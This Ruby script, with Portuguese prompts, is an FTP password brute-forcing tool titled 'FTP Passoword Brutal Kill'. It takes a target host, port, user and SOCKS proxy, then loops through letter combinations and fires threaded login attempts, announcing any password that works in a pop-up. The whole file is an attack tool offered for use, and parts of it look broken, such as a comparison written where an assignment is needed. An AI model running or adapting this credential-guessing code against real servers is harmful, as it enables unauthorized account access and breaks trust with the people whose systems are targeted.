require 'Win32API'

system('title "FTP Passoword Brutal Kill - By: PedroHLC"')
puts 'FTP Passoword Brutal Kill'
puts 'By: PedroHLC'
puts '-------------------------------'

load('.\ftp_psw_gen.cfg')# if File.exist?('.\ftp_psw_gen.cfg')

if $proxy.nil?
  print 'Digite a Proxy (Use IP:Porta): '
  $proxy = gets.to_s
end
if $host.nil?
  print 'Digite o Host: '
  $host = gets.to_s
end
if $port.nil?
  print 'Digite a Porta: '
  $port = gets.to_i
end
if $user.nil?
  print 'Digite o usuario: '
  $user = gets.to_s
end
if $passive.nil?
  print 'O Host e passivo? [S,N]: '
  $passive = (gets.to_s.downcase[0] == 's'[0])
end
if $tryingthis.nil?
  puts 'Utilizando apenas letras como caracteres conhecidos...'
  $tryingthis == array
  ('a'..'z').to_a.each{|c|
    $tryingthis.push(c)
  }
  ('A'..'Z').to_a.each{|c|
    $tryingthis.push(c)
  }
end

require 'net/ftp'

def discover_char(code)
  return nil if code < 0
  if code > 9
    char = "A"
    char[0] += (code - 10)
  else
    char = "0"
    char[0] += code
  end
  return char
end

if $digits_min.nil?
  print 'Digite a quantidade minima de digitos: '
  $digits_min = gets.to_i
end
if $digits_limit.nil?
  print 'Digite a quantidade maxima de digitos: '
  $digits_limit = gets.to_i
end

pass = Array.new($digits_limit, 0)
for i in 0..($digits_min - 1)
	z = $digits_limit - 1 - i
	pass[z] += 1
end

tryingsz = $tryingthis.size
puts 'Tentando com '+ tryingsz.to_s + ' caracteres diferentes.' 
puts '-------------------------------'

ENV['SOCKS_SERVER'] = $proxy
$ftp = Net::FTP.new
$ftp.connect($host, $port)
$ftp.passive = $passive

def chararray2str(chararray)
	str = ''
	for i in 0..(chararray.size - 1)
		key = chararray[i]
		if key > 0
			str += $tryingthis[key - 1]
		end
	end
	return str
end

limit = ($digits_limit - 1)
$threads = []
$mb = Win32API.new('user32', 'MessageBox', 'lppi', 'i')
puts 'Se você estiver em um console, os caracteres serão vistos errados...'
loop do
	pass[limit] += 1
	for z in 0..limit
		i = limit - z
		if pass[i] > tryingsz
			if z == limit
				break
			else
				pass[i-1] += 1
				pass[i] = 1
			end
		end
	end
	pass_str = chararray2str(pass)
	puts 'trying: ' + pass_str
	$threads.push Thread.new{
		trying_now = pass_str.dup
		begin
			$ftp.login($user, trying_now)
			z = "Key founded: " + trying_now
			puts z
			$mb.call(0, z, z, 0)
			#gets
			#break
		rescue Exception => error
			#puts error
		end
	}
end
while(true)
end
#$ftp.close